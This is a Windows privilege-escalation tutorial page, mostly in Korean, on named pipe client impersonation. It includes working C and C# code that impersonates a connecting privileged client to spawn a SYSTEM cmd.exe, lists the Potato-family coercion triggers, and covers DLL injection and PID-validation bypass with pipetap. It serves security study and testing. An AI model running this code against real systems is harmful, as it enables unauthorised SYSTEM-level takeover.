# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation은 named-pipe 서버 스레드가 연결된 클라이언트의 security context를 채택할 수 있게 해주는 local privilege escalation primitive입니다. 실제로 SeImpersonatePrivilege 권한으로 코드를 실행할 수 있는 공격자는 권한 있는 클라이언트(예: SYSTEM 서비스)를 공격자 제어 파이프에 연결하도록 유도하고, ImpersonateNamedPipeClient를 호출하여 생성된 토큰을 primary 토큰으로 Duplicate한 뒤 클라이언트로서 프로세스를 생성할 수 있습니다(종종 NT AUTHORITY\SYSTEM).

이 페이지는 핵심 기법에 중점을 둡니다. SYSTEM을 당신의 파이프에 강제로 연결시키는 end-to-end exploit chains에 대해서는 아래에 참조된 Potato family pages를 보세요.

## 요약
- \\.\pipe\<random> 이름의 named pipe를 생성하고 연결을 기다립니다.
- 권한 있는 구성요소가 그것에 연결하도록 만듭니다 (spooler/DCOM/EFSRPC/etc.).
- 파이프에서 적어도 한 개의 메시지를 읽은 다음 ImpersonateNamedPipeClient를 호출합니다.
- 현재 스레드에서 impersonation token을 열고 DuplicateTokenEx(TokenPrimary)로 primary 토큰을 만든 후 CreateProcessWithTokenW/CreateProcessAsUser로 SYSTEM 프로세스를 생성합니다.

## Requirements and key APIs
- 호출 프로세스/스레드가 일반적으로 필요로 하는 권한:
- SeImpersonatePrivilege: 연결된 클라이언트를 성공적으로 impersonate하고 CreateProcessWithTokenW를 사용하기 위해 필요합니다.
- 또는 SYSTEM을 임시로 가장한 다음 CreateProcessAsUser를 사용할 수 있으며, 이는 SeAssignPrimaryTokenPrivilege와 SeIncreaseQuotaPrivilege가 필요할 수 있습니다(이 권한들은 SYSTEM을 임시로 가장하고 있을 때 충족됩니다).
- 사용되는 핵심 API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (임시 위임 전에 적어도 한 메시지를 읽어야 함)
- ImpersonateNamedPipeClient 및 RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW 또는 CreateProcessAsUser
- Impersonation level: 로컬에서 유용한 작업을 수행하려면 클라이언트가 SecurityImpersonation을 허용해야 합니다(많은 로컬 RPC/named-pipe 클라이언트의 기본값). 클라이언트는 파이프를 열 때 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION로 이를 낮출 수 있습니다.

## 최소 Win32 워크플로 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET 간단 예제
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe로 강화된 서비스도 신뢰된 클라이언트를 계측하면 여전히 탈취될 수 있습니다. [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) 같은 도구는 클라이언트에 헬퍼 DLL을 주입해 트래픽을 프록시하고, SYSTEM 서비스가 소비하기 전에 권한 있는 IPC를 변조할 수 있게 합니다.

### Inline API hooking inside trusted processes
- 헬퍼 DLL을 임의의 클라이언트에 주입합니다 (OpenProcess → CreateRemoteThread → LoadLibrary).
- DLL은 Detours로 `ReadFile`, `WriteFile` 등을 훅하지만, `GetFileType`가 `FILE_TYPE_PIPE`를 보고할 때만 동작하여 각 버퍼/메타데이터를 제어용 파이프에 복사하고 편집/삭제/재생할 수 있게 한 뒤 원래 API로 복귀시킵니다.
- 합법적 클라이언트를 Burp-style 프록시로 바꿔 UTF-8/UTF-16/raw 페이로드를 일시정지하거나, 에러 경로를 유도하거나, 시퀀스를 재생하거나 JSON 트레이스를 내보낼 수 있습니다.

### Remote client mode to defeat PID-based validation
- 허용 목록에 있는 클라이언트에 주입한 뒤 GUI에서 해당 파이프와 그 PID를 선택합니다.
- DLL은 신뢰된 프로세스 내부에서 `CreateFile`/`ConnectNamedPipe`를 호출하고 I/O를 다시 전달하므로 서버는 여전히 정당한 PID/image를 관찰합니다.
- `GetNamedPipeClientProcessId`나 서명된 이미지 검사에 의존하는 필터를 우회합니다.

### Fast enumeration and fuzzing
- `pipelist`는 `\\.\pipe\*`를 열거하고 ACLs/SIDs를 표시한 후 즉시 탐침을 위해 항목을 다른 모듈로 전달합니다.
- 파이프 클라이언트/메시지 컴포저는 임의의 이름에 연결해 UTF-8/UTF-16/raw-hex 페이로드를 생성합니다; 캡처된 블롭을 가져와 필드를 변형하고 재전송하여 deserializers나 인증되지 않은 명령 동사를 찾습니다.
- 헬퍼 DLL은 루프백 TCP 리스너를 호스트할 수 있어 tooling/fuzzers가 Python SDK를 통해 원격으로 파이프를 제어할 수 있습니다.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
TCP bridge와 VM snapshot restores를 결합하여 취약한 IPC parsers의 충돌 테스트를 수행하세요.

### 운영 고려사항
- Named pipes는 지연이 거의 없으므로 버퍼를 편집하는 동안 긴 일시정지가 발생하면 취약한 서비스가 데드락에 빠질 수 있습니다.
- Overlapped/completion-port I/O 커버리지는 부분적이므로 예외 케이스를 예상하세요.
- Injection은 탐지 가능하고 서명되지 않았으므로 은밀한 implant라기보다 실험실/exploit-dev 보조 도구로 취급하세요.

## 문제 해결 및 유의사항
- ImpersonateNamedPipeClient를 호출하기 전에 파이프에서 적어도 하나의 메시지를 읽어야 합니다; 그렇지 않으면 ERROR_CANNOT_IMPERSONATE (1368)가 발생합니다.
- 클라이언트가 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION으로 연결하면 서버는 완전한 임퍼소네이션을 할 수 없습니다; GetTokenInformation(TokenImpersonationLevel)을 통해 토큰의 impersonation level을 확인하세요.
- CreateProcessWithTokenW는 호출자에게 SeImpersonatePrivilege가 필요합니다. 만약 ERROR_PRIVILEGE_NOT_HELD (1314)로 실패하면 먼저 SYSTEM으로 임퍼소네이트한 후 CreateProcessAsUser를 사용하세요.
- 파이프를 강화했다면 파이프의 security descriptor가 대상 서비스가 연결할 수 있도록 허용하는지 확인하세요; 기본적으로 \\.\pipe 아래의 파이프는 서버의 DACL에 따라 접근 가능합니다.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
